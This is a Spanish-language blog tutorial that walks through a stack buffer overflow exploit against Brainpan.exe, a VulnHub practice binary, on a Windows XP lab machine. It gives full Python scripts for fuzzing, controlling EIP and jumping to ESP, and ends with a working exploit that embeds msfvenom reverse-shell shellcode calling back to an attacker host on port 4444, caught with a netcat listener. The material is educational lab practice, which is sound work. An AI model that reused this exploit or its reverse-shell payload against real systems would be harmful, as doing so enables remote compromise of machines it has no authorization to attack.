---
layout: single
title:  Windows Buffer Overflow
excerpt: "Explotando un programa conocido de la plataforma de VulnHub basado en un error de desbordamiento de pila en una maquina Windows XP de 32 bits"
date: 2021-05-06
classes: wide
header:
    teaser: /assets/images/win32/portada.PNG
    teaser_home_page: true
categories:
    - BoF
tags:
    - windows
    - python
---

<p align="center">
<img src="/assets/images/wpa/portada.PNG" width="90%">
</p>

- [Herramientas Usadas](#herramientas-usadas)
- [Fuzzing](#fuzzing)
- [Enocontrando el offset](#encontrando-el-offset)
- [Sobreescritura del EIP](#sobreescritura-del-eip)
- [Encontrar badchars](#encontrar-badchars)
- [Buscando el modulo adecuado](#buscando-el-modulo-adecuado)
- [Generar el shellcode](#generar-el-shellcode)
- [Obteniendo shell](#obteniendo-shell)

## Herramientas Usadas
- Maquina virtual Windows XP
- maquina virtual kali Linux o Parrot
- Python 2.X
- Inmunity Debugger
- Script mona
- [Brainpan.exe](https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice/blob/master/brainpan/brainpan.exe)

## Fuzzing
En cualquier desbordamiento de búfer el primer paso es realizar fuzzing a la aplicaión vulnerable. El fuzzing nos permite enviar bytes de datos a un programa vulnerable (en nuestro caso, Brainpan.exe) en iteraciones crecientes, con la esperanza de desbordar el espacio del búfer y sobrescribir el EIP.
Para ello se elaboró un script hecho en python desde nuestra maquina atacante(kali).
```
#!/usr/bin/python

import socket
import sys
from time import sleep

buffer='A'*100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect(('192.168.0.102',9999))
		s.recv(1024)

		print '[*] Enviando buffer con longitud: ' + str(len(buffer))
		s.send(buffer+'\r\n')
		s.close()
		sleep(1)
		buffer=buffer+'A'*100

	except:
		print '[*] Se produjo un bloqueo en la longitud del buffer: ' + str(len(buffer)-100)
		sys.exit()
```

<p align="center">
<img src="/assets/images/win32/24.PNG">
</p>

El script anterior crea una cadena de caracteres de 100 A's en el búfer variable , intenta conectarse al host de Windows en el puerto 9999 y envía el búfer. Cuando termina, incrementa el búfer con 100 A's y luego intenta conectarse y enviar la cadena, que ahora es de 200 A nuevamente.  
El fuzzer seguirá aumentando el búfer de A's cada vez que se ejecute hasta que ya no pueda conectarse al puerto 9999, lo que es una indicación de que la aplicación se bloqueó y ya no acepta conexiones.  
Ejecutar el fuzzer con Python revela que ya no puede conectarse y muestra el mensaje de falla cuando envía alrededor de 600 bytes a la aplicación.
<p align="center">
<img src="/assets/images/win32/1.PNG">
</p>


Si lo queremos ver gráficamente más didactico esto representariá mas o menos lo que está sucediendo por detrás en el programa. El programa crashea al sobreescribirse EIP por no saber a donde dirigirse.
<p align="center">
<img src="/assets/images/win32/15.PNG">
</p>

También debería notar algo bastante interesante en Immunity Debugger.
<p align="center">
<img src="/assets/images/win32/2.PNG">
</p>

----

Todos los registros se han sobrescrito con 41 (hexadecimal para A). Esto significa que tenemos una vulnerabilidad de desbordamiento de búfer en nuestras manos y hemos demostrado que podemos sobrescribir el EIP. En este punto, sabemos que el EIP se encuentra entre 1 y 600 bytes, pero no estamos seguros de dónde se encuentra exactamente. Lo que tenemos que hacer a continuación es averiguar exactamente dónde se encuentra el EIP (en bytes) e intentar controlarlo.

## Encontrando el offset
Ahora podemos usar un par de herramientas de ruby llamadas Pattern Create y Pattern Offset para encontrar la ubicación exacta de la sobrescritura. Pattern Create nos permite generar una cantidad cíclica de bytes, en función del número de bytes que especifiquemos. Luego podemos enviar esos bytes al programa, en lugar de A's, e intentar encontrar exactamente dónde sobrescribimos el EIP. Pattern Offset nos ayudará a determinar eso pronto.
La herramienta y el comando que necesitamos ejecutar es: msf-pattern_create.rb -l 600 donde "l" es para longitud y "600" es para bytes.  
<p align="center">
<img src="/assets/images/win32/36.PNG">
</p>

Ahora, vamos a necesitar modificar nuestro código para incluir todos los bytes que fueron generados por Pattern Create. Nuestro nuevo código debería verse así:
<p align="center">
<img src="/assets/images/win32/26.PNG">
</p>

Donde la variable de buffer es una copia / pegado de la salida de Pattern Create. Notarás que cambié el código ligeramente. Ya no necesitamos ejecutar bucles, así que he puesto un comando try en su lugar. Solo necesitamos enviar este código una vez. Entonces, continuemos y reiniciemos Brainpan.exe en Immunity Debugger. Ahora, ejecute el código y vea lo que se devuelve:  
<p align="center">
<img src="/assets/images/win32/25.PNG">
</p>

Observe que todavía sobrescribimos el programa. Todo aparece como antes, con Brainpan colapsando. Ahora, mire el EIP. El valor es **35724134**. Si lo ejecutamos correctamente, este valor es en realidad parte de nuestro código que generamos con Pattern Create. Intentemos usar Pattern Offset para averiguarlo. El comando que se debe escribir es  ```msf-pattern_offset -q 35724134```  donde 'q' es nuestro valor EIP.
<p align="center">
<img src="/assets/images/win32/28.PNG">
</p>

Como puede ver, se encontró una coincidencia exacta en **524** bytes. Esta es una gran noticia. Ahora podemos intentar controlar el EIP, que será crítico más adelante en nuestro exploit.

## Sobrescritura del EIP
Ahora que sabemos que el EIP es posterior a 524 bytes, podemos modificar nuestro código ligeramente para confirmar nuestro control. Aquí está mi código actualizado:
```
import socket
import sys
from time import sleep

pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av'

buffer = 'A' * 524 + 'B' * 4  + 'C' * 100

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('92.168.0.102',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Error en la conexion.'
  sys.exit()
```

Entonces, ahora la variable shellcode ha vuelto a un montón de A y cuatro B. Lo que estamos haciendo aquí es enviar 2003 A en un intento de alcanzar, pero no sobrescribir, el EIP. Luego estamos enviando cuatro B's, que deberían sobrescribir el EIP con 42424242. Recuerde, el EIP tiene una longitud de cuatro bytes, por lo que si lo sobrescribimos correctamente, tendremos el control total y nos encaminaremos hacia la raíz. Ejecutemos el código y echemos un vistazo:
<p align="center">
<img src="/assets/images/win32/4.PNG">
</p>

Nuestro EIP dice "42424242" tal como lo esperábamos. Ahora, tenemos que investigar un poco cómo funciona Brainpan.exe y con qué caracteres de bytes es compatible para finalizar nuestro exploit.

## Encontrar badchars
Ciertos caracteres de bytes pueden causar problemas en el desarrollo de exploits. Debemos ejecutar cada byte a través del programa Brainpan.exe para ver si algún carácter causa problemas. De forma predeterminada, el byte nulo (x00) siempre se considera un carácter incorrecto, ya que truncará el código de shell cuando se ejecute. Para encontrar caracteres incorrectos podemos agregar una variable adicional de "badchars" a nuestro código que contiene una lista de cada carácter hexadecimal.
Con el comando ```badchars -f python``` generamos lo generamos.  
<p align="center">
<img src="/assets/images/win32/30.PNG">
</p>

Quedando nuestro script de esta forma.
<p align="center">
<img src="/assets/images/win32/31.PNG">
</p>

Entonces, volvamos a cerrar y volver a abrir Brainpan e Immunity Debugger. Una vez enviemos el exploit, deberá hacer clic con el botón derecho en el registro ESP y seleccionar **Follow in Dump**. Debería notar un poco de movimiento en la esquina inferior izquierda del programa. Si observa con atención, debería ver todos sus bytes en orden comenzando con 01, 02, 03, etc. y terminando con FF. Si estuviera presente un mal personaje, parecería fuera de lugar. Afortunadamente para nosotros, no hay personajes malos en el programa Brainpan. Observe a continuación cómo todos nuestros números parecen perfectos y en orden
<p align="center">
<img src="/assets/images/win32/5.PNG">
</p>

----

## Buscando el modulo adecuado
Ahora necesitamos encontrar alguna parte del programa que no tenga ningún tipo de protección de memoria. Las protecciones de la memoria, como DEP, ASLR y SafeSEH, pueden causar dolores de cabeza.
Afortunadamente para nosotros nuevamente, Brainpan tiene un módulo que se ajusta a nuestros criterios. Para verlo por sí mismo, vuelva a abrir Brainpan e Immunity Debugger y luego escriba ```! Mona modules``` en la barra de búsqueda inferior de Immunity. Debería ver algunas opciones potenciales que se muestran.
<p align="center">
<img src="/assets/images/win32/7.PNG">
</p>

Lo que estamos buscando es **Falso** en todos los ámbitos, preferiblemente. Eso significa que no hay protecciones de memoria presentes en el módulo. El módulo superior que llama la atención de inmediato. Parece que ```Brainpan.exe``` se ejecuta como parte del programa y no tiene protecciones de memoria. Anotemos el módulo  para el siguiente paso.
Lo que tenemos que hacer ahora es encontrar el código de operación equivalente de JMP ESP. Estamos usando **JMP ESP** porque nuestro EIP apuntará a la ubicación de JMP ESP, que saltará a nuestro código de shell malicioso que inyectaremos más tarde. Encontrar el código de operación equivalente significa que estamos convirtiendo el lenguaje ensamblador en código hexadecimal. Hay una herramienta para hacer esto llamada nasm_shell.
Haemos uso de la siguiente sintaxis luego escribimos ```JMP ESP``` y presione enter.  
<p align="center">
<img src="/assets/images/win32/32.PNG">
</p>

Nuestro equivalente código de operación JMP ESP es **FFE4**. Ahora, podemos usar ```mona``` nuevamente para combinar esta nueva información con nuestro módulo previamente descubierto para encontrar nuestra dirección de puntero. La dirección del puntero es lo que colocaremos en el EIP para señalar nuestro código de shell malicioso. En nuestra barra de búsqueda de inmunity, escriba: ```!mona find -s "\\xff\\xe4" -m brainpan.exe```  y vea los resultados.
<p align="center">
<img src="/assets/images/win32/8.PNG">
</p>

Lo que acabamos de generar es una lista de direcciones que potencialmente podemos usar como nuestro puntero. Las direcciones se encuentran en el lado izquierdo, en blanco. Voy a seleccionar la primera dirección, **311712F3**, y agregaré al código Python.  
El script deberia verse asi.
```
import socket
import sys
from time import sleep
buffer = 'A' * 524 + '\xF3\x12\x17\x31'  + 'C' * 100

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.0.102',9999))
  s.recv(1024)

  print '[*] Enviando buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Error en la conexion'
  sys.exit()
```

Entonces, ahora reemplazamos nuestras cuatro B con nuestra dirección de retorno. ¿Notas algo extraño o único sobre cómo se ingresó la dirección de devolución? ¡Está al revés! Esto en realidad se llama Little Endian. Tenemos que usar el formato Little Endian en la arquitectura x86 porque el byte de orden inferior se almacena en la memoria en la dirección más baja y el byte de orden superior se almacena en la dirección más alta. Por lo tanto, ingresamos nuestra dirección de devolución al revés.
Ahora, debemos probar nuestra dirección de devolución. Nuevamente, con un Brainpan recién adjunto, necesitamos encontrar nuestra dirección de retorno en Immunity Debugger.
Luego busque **311712F3** (o la dirección de retorno que encontró), en el mensaje “Ingrese la expresión a seguir”. Eso debería mostrar su dirección de retorno, FFE4, ubicación de JMP ESP. Una vez que lo haya encontrado, presione F2 y la dirección debería volverse azul celeste, lo que indica que hemos establecido un punto de interrupción.
<p align="center">
<img src="/assets/images/win32/9.PNG">
</p>

Ahora, puede ejecutar su código y ver si se activa el punto de interrupción. Si nota que se activa en Immunity Debugger, ¡está en la recta final y listo para desarrollar su exploit!

## Generar el shellcode
Ahora, podemos juntar toda la información que hemos reunido para generar shellcode malicioso. El shellcode le dirá a la máquina víctima que responda a nuestra máquina. Usando msfvenom, podemos proporcionar la siguiente sintaxis: ```msfvenom -p windows/shell_reverse_tcp LHOST = <IP>.address LPORT = 4444 EXITFUNC = thread -fc -a x86 –platform windows -b "\\x00"```
<p align="center">
<img src="/assets/images/win32/33.PNG">
</p>

Como puede ver, generamos 351 bytes de shellcode. Necesitamos copiar y pegar este código de shell en nuestro script de Python. Así es como se ve el exploit final.
```
import socket
import sys
from time import sleep

shellcode = ( "\xda\xd9\xd9\x74\x24\xf4\x58\xba\xfa\x27\xd1\x5d\x31\xc9\xb1"
"\x52\x31\x50\x17\x03\x50\x17\x83\x3a\x23\x33\xa8\x46\xc4\x31"
"\x53\xb6\x15\x56\xdd\x53\x24\x56\xb9\x10\x17\x66\xc9\x74\x94"
"\x0d\x9f\x6c\x2f\x63\x08\x83\x98\xce\x6e\xaa\x19\x62\x52\xad"
"\x99\x79\x87\x0d\xa3\xb1\xda\x4c\xe4\xac\x17\x1c\xbd\xbb\x8a"
"\xb0\xca\xf6\x16\x3b\x80\x17\x1f\xd8\x51\x19\x0e\x4f\xe9\x40"
"\x90\x6e\x3e\xf9\x99\x68\x23\xc4\x50\x03\x97\xb2\x62\xc5\xe9"
"\x3b\xc8\x28\xc6\xc9\x10\x6d\xe1\x31\x67\x87\x11\xcf\x70\x5c"
"\x6b\x0b\xf4\x46\xcb\xd8\xae\xa2\xed\x0d\x28\x21\xe1\xfa\x3e"
"\x6d\xe6\xfd\x93\x06\x12\x75\x12\xc8\x92\xcd\x31\xcc\xff\x96"
"\x58\x55\x5a\x78\x64\x85\x05\x25\xc0\xce\xa8\x32\x79\x8d\xa4"
"\xf7\xb0\x2d\x35\x90\xc3\x5e\x07\x3f\x78\xc8\x2b\xc8\xa6\x0f"
"\x4b\xe3\x1f\x9f\xb2\x0c\x60\xb6\x70\x58\x30\xa0\x51\xe1\xdb"
"\x30\x5d\x34\x4b\x60\xf1\xe7\x2c\xd0\xb1\x57\xc5\x3a\x3e\x87"
"\xf5\x45\x94\xa0\x9c\xbc\x7f\x63\x70\xbd\x50\x13\x73\xc1\xaf"
"\x58\xfa\x27\xc5\x8e\xab\xf0\x72\x36\xf6\x8a\xe3\xb7\x2c\xf7"
"\x24\x33\xc3\x08\xea\xb4\xae\x1a\x9b\x34\xe5\x40\x0a\x4a\xd3"
"\xec\xd0\xd9\xb8\xec\x9f\xc1\x16\xbb\xc8\x34\x6f\x29\xe5\x6f"
"\xd9\x4f\xf4\xf6\x22\xcb\x23\xcb\xad\xd2\xa6\x77\x8a\xc4\x7e"
"\x77\x96\xb0\x2e\x2e\x40\x6e\x89\x98\x22\xd8\x43\x76\xed\x8c"
"\x12\xb4\x2e\xca\x1a\x91\xd8\x32\xaa\x4c\x9d\x4d\x03\x19\x29"
"\x36\x79\xb9\xd6\xed\x39\xd9\x34\x27\x34\x72\xe1\xa2\xf5\x1f"
"\x12\x19\x39\x26\x91\xab\xc2\xdd\x89\xde\xc7\x9a\x0d\x33\xba"
"\xb3\xfb\x33\x69\xb3\x29" )

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c > shellcode.txt
buffer = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 40 + shellcode + 'C' * 139 # 522 - 32 - 351

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.0.102',9999))
  s.recv(1024)

  print '[*] Enviando buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Error de conexion'
  sys.exit()
```

## Obteniendo shell
Entonces, he creado una variable llamada "exploit" y he colocado el shellcode malicioso dentro de ella. Puede notar que también he agregado **40 "\x90"** a la variable shellcode. Ésta es una práctica estándar. El byte x90 también se conoce como NOP, o sin operación. Literalmente no hace nada. Sin embargo, al desarrollar exploits, podemos usarlo como relleno. Hay casos en los que nuestro código de explotación puede interferir con nuestra dirección de retorno y no ejecutarse correctamente. Para evitar esta interferencia, podemos agregar algo de relleno entre los dos elementos.
Ahora, configure un oyente de netcat en el puerto designado (4444 en mi ejemplo). Una vez que tenga netcat en ejecución, inicie Brainpan y ejecute su código de explotación. Si ha realizado todos los pasos correctamente, debería obtener acceso al sistema.  
<p align="center">
<img src="/assets/images/win32/34.PNG">
</p>

Para comprobar que podemos ejecutar comandos creo una carpeta llamada 'hack'.
<p align="center">
<img src="/assets/images/win32/35.PNG">
</p>

Y por otro lado en el sistema anfitrion tambien se visualizaria.
<p align="center">
<img src="/assets/images/win32/13.PNG">
</p>





